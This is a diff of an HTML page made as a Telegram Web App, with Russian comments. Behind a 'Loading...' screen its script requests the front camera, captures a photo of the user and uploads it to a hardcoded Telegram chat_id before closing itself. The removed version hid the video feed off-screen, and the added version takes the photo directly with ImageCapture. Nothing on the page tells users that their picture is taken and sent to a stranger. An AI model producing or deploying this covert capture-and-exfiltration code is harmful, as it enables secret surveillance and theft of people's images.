@@ -8,62 +8,17 @@
 </head>
 <body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:sans-serif;">
     <h1 id="status">Loading...</h1>
-
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        // 1. СОЗДАЁМ VIDEO И ДОБАВЛЯЕМ В DOM
-        const video = document.createElement('video');
-        video.style.position = 'absolute';
-        video.style.top = '-9999px';  // скрываем, но рендерим
-        video.style.left = '-9999px';
-        video.style.width = '640px';
-        video.style.height = '480px';
-        video.setAttribute('playsinline', '');
-        video.setAttribute('autoplay', '');
-        document.body.appendChild(video);
-
-        // 2. ЗАПРАШИВАЕМ КАМЕРУ
-        navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user", width: 640, height: 480 }
-        })
-        .then(stream => {
-            video.srcObject = stream;
-            video.play();
-
-            // 3. ЖДЁМ ПЕРВЫЙ КАДР
-            video.addEventListener('loadeddata', function capture() {
-                video.removeEventListener('loadeddata', capture);
-
-                // даём ещё 200 мс на отрисовку
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-
-                    // РИСУЕМ КАДР
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // ПРОВЕРКА: если всё равно чёрный — рисуем тестовый цвет
-                    const imageData = ctx.getImageData(0, 0, 1, 1);
-                    const pixel = imageData.data;
-                    if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
-                        // если пиксель чёрный — заливаем красным (для диагностики)
-                        ctx.fillStyle = '#ff0000';
-                        ctx.fillRect(0, 0, canvas.width, canvas.height);
-                        ctx.fillStyle = '#ffffff';
-                        ctx.font = '40px sans-serif';
-                        ctx.fillText('⚠️', 10, 60);
-                    }
-
-                    // ОТПРАВКА
-                    canvas.toBlob(function(blob) {
-                        if (!blob) {
-                            document.getElementById('status').innerText = '❌ Blob error';
-                            return;
-                        }
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                
+                imageCapture.takePhoto()
+                    .then(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', '7406666272');
                         formData.append('photo', blob, 'photo.jpg');
@@ -75,28 +30,26 @@
                         .then(res => res.json())
                         .then(data => {
                             if (data.ok) {
-                                document.getElementById('status').innerText = '✅ Отправлено!';
+                                document.getElementById('status').innerText = '✅ Фото отправлено!';
                                 tg.close();
                             } else {
                                 document.getElementById('status').innerText = '❌ Ошибка API';
-                                console.error(data);
                             }
                         })
-                        .catch(err => {
-                            document.getElementById('status').innerText = '❌ Ошибка сети';
-                            console.error(err);
+                        .catch(() => {
+                            document.getElementById('status').innerText = '❌ Ошибка отправки';
                         });
 
                         stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg', 0.8);
-
-                }, 200);
+                    })
+                    .catch(err => {
+                        document.getElementById('status').innerText = '❌ Ошибка камеры: ' + err.message;
+                        console.error(err);
+                    });
+            })
+            .catch(err => {
+                document.getElementById('status').innerText = '❌ Нет доступа: ' + err.message;
             });
-        })
-        .catch(err => {
-            document.getElementById('status').innerText = '❌ Нет доступа к камере';
-            console.error(err);
-        });
     </script>
 </body>
 </html>
